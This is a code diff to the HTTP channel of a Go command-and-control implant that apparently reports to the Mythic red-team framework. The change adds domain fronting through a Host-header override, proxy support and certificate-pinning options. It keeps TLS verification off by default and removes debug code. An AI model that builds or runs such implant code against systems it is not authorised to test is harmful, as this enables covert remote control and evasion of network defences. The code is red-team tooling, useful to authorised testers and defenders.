@@ -8,12 +8,15 @@ import (
 	"crypto/rand"
 	"crypto/sha256"
 	"crypto/tls"
+	"crypto/x509"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
 	"log"
 	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -31,12 +34,13 @@ type HTTPProfile struct {
 	Debug         bool
 	GetEndpoint   string
 	PostEndpoint  string
+	HostHeader    string // Override Host header for domain fronting
 	client        *http.Client
 	CallbackUUID  string // Store callback UUID from initial checkin
 }
 
 // NewHTTPProfile creates a new HTTP profile
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint string) *HTTPProfile {
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify string) *HTTPProfile {
 	profile := &HTTPProfile{
 		BaseURL:       baseURL,
 		UserAgent:     userAgent,
@@ -47,22 +51,72 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		Debug:         debug,
 		GetEndpoint:   getEndpoint,
 		PostEndpoint:  postEndpoint,
+		HostHeader:    hostHeader,
 	}
 
-	// Create HTTP client with reasonable defaults
+	// Configure TLS based on verification mode
+	tlsConfig := buildTLSConfig(tlsVerify)
+
+	// Configure transport with optional proxy
+	transport := &http.Transport{
+		TLSClientConfig:     tlsConfig,
+		MaxIdleConns:        10,
+		MaxIdleConnsPerHost: 5,
+		IdleConnTimeout:     90 * time.Second,
+	}
+
+	// Configure proxy if specified
+	if proxyURL != "" {
+		if proxyU, err := url.Parse(proxyURL); err == nil {
+			transport.Proxy = http.ProxyURL(proxyU)
+		}
+	}
+
 	profile.client = &http.Client{
-		Timeout: 30 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true, // For testing - should be configurable
-			},
-			MaxIdleConns:        10,
-			MaxIdleConnsPerHost: 5,
-			IdleConnTimeout:     90 * time.Second,
-		},
+		Timeout:   30 * time.Second,
+		Transport: transport,
 	}
 
 	return profile
+}
+
+// buildTLSConfig creates a TLS configuration based on the verification mode.
+// Modes: "none" (skip verification), "system-ca" (OS trust store), "pinned:<hex-sha256>" (cert pin)
+func buildTLSConfig(tlsVerify string) *tls.Config {
+	switch {
+	case tlsVerify == "system-ca":
+		// Use the operating system's certificate trust store
+		return &tls.Config{
+			InsecureSkipVerify: false,
+			MinVersion:         tls.VersionTLS12,
+		}
+	case strings.HasPrefix(tlsVerify, "pinned:"):
+		// Pin to a specific certificate SHA-256 fingerprint
+		fingerprint := strings.TrimPrefix(tlsVerify, "pinned:")
+		expectedHash, err := hex.DecodeString(fingerprint)
+		if err != nil || len(expectedHash) != 32 {
+			// Invalid fingerprint — fall back to skip verify to avoid bricking the agent
+			return &tls.Config{InsecureSkipVerify: true}
+		}
+		return &tls.Config{
+			InsecureSkipVerify: true, // We do our own verification in VerifyPeerCertificate
+			MinVersion:         tls.VersionTLS12,
+			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
+				if len(rawCerts) == 0 {
+					return fmt.Errorf("no certificates presented")
+				}
+				// Hash the leaf certificate's raw DER bytes
+				hash := sha256.Sum256(rawCerts[0])
+				if !bytes.Equal(hash[:], expectedHash) {
+					return fmt.Errorf("certificate fingerprint mismatch")
+				}
+				return nil
+			},
+		}
+	default:
+		// "none" or unrecognized — skip verification (backward compatible default)
+		return &tls.Config{InsecureSkipVerify: true}
+	}
 }
 
 // Checkin performs the initial checkin with Mythic
@@ -82,10 +136,6 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 		Integrity:    agent.Integrity,
 	}
 
-	if h.Debug {
-		// log.Printf("[DEBUG] Checkin message: %+v", checkinMsg)
-	}
-
 	body, err := json.Marshal(checkinMsg)
 	if err != nil {
 		return fmt.Errorf("failed to marshal checkin message: %w", err)
@@ -94,9 +144,6 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	// Encrypt if encryption key is provided
 	if h.EncryptionKey != "" {
 		body = h.encryptMessage(body)
-		if h.Debug {
-			// log.Printf("[DEBUG] Checkin message encrypted")
-		}
 	}
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
@@ -118,10 +165,6 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	respBody, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return fmt.Errorf("failed to read checkin response: %w", err)
-	}
-
-	if h.Debug {
-		// log.Printf("[DEBUG] Checkin response body: %s", string(respBody))
 	}
 
 	// Decrypt the checkin response if needed
@@ -173,9 +216,6 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 
 // GetTasking retrieves tasks and inbound SOCKS data from Mythic, sending any pending outbound SOCKS data
 func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
-	if h.Debug {
-		// log.Printf("[DEBUG] GetTasking URL: %s%s", h.BaseURL, h.GetEndpoint)
-	}
 	taskingMsg := structs.TaskingMessage{
 		Action:      "get_tasking",
 		TaskingSize: -1, // Get all pending tasks (important for SOCKS throughput)
@@ -194,9 +234,6 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 	// Encrypt if encryption key is provided
 	if h.EncryptionKey != "" {
 		body = h.encryptMessage(body)
-		if h.Debug {
-			// log.Printf("[DEBUG] Tasking message encrypted")
-		}
 	}
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
@@ -230,9 +267,6 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 	// Decrypt the response if encryption key is provided
 	var decryptedData []byte
 	if h.EncryptionKey != "" {
-		if h.Debug {
-			// log.Printf("[DEBUG] Decrypting response...")
-		}
 		// First, base64 decode the response
 		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
 		if err != nil {
@@ -287,7 +321,9 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 	var inboundSocks []structs.SocksMsg
 	if socksList, exists := taskResponse["socks"]; exists {
 		if socksRaw, err := json.Marshal(socksList); err == nil {
-			json.Unmarshal(socksRaw, &inboundSocks)
+			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
+				log.Printf("Warning: failed to parse SOCKS messages: %v", err)
+			}
 		}
 	}
 
@@ -311,13 +347,7 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 		return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
 	}
 
-	// Extract UUID (first 36 bytes)
-	_ = encryptedData[:36] // uuidBytes for potential debug use
-	if h.Debug {
-		// log.Printf("[DEBUG] Response UUID: %s", string(uuidBytes))
-	}
-
-	// Extract IV (next 16 bytes)
+	// Skip UUID (first 36 bytes), extract IV (next 16 bytes)
 	iv := encryptedData[36:52]
 
 	// Extract HMAC (last 32 bytes)
@@ -362,8 +392,8 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
 	}
 
-	if len(ciphertext)%aes.BlockSize != 0 {
-		return nil, fmt.Errorf("ciphertext length not multiple of block size")
+	if len(ciphertext) == 0 || len(ciphertext)%aes.BlockSize != 0 {
+		return nil, fmt.Errorf("invalid ciphertext length: %d", len(ciphertext))
 	}
 
 	mode := cipher.NewCBCDecrypter(block, iv)
@@ -385,7 +415,6 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 	return plaintext[:len(plaintext)-padding], nil
 }
 
-// getActiveUUID returns the callback UUID if available, otherwise the payload UUID
 // getActiveUUID returns the callback UUID if available, otherwise the payload UUID
 func (h *HTTPProfile) getActiveUUID(agent *structs.Agent) string {
 	if h.CallbackUUID != "" {
@@ -430,7 +459,10 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 	defer resp.Body.Close()
 
 	// Read response body
-	respBody, _ := io.ReadAll(resp.Body)
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read PostResponse body: %w", err)
+	}
 
 	if resp.StatusCode != http.StatusOK {
 		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
@@ -493,6 +525,11 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 	req.Header.Set("User-Agent", h.UserAgent)
 	req.Header.Set("Content-Type", "text/plain")
 	req.Header.Set("Accept", "*/*")
+
+	// Override Host header for domain fronting
+	if h.HostHeader != "" {
+		req.Host = h.HostHeader
+	}
 
 	if h.Debug {
 		// log.Printf("[DEBUG] Making %s request to %s", method, url)
@@ -586,7 +623,7 @@ func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
 	if blockSize <= 0 {
 		return nil, fmt.Errorf("invalid blocksize")
 	}
-	if data == nil || len(data) == 0 {
+	if len(data) == 0 {
 		return nil, fmt.Errorf("invalid PKCS7 data (empty or not padded)")
 	}
 	padding := blockSize - len(data)%blockSize
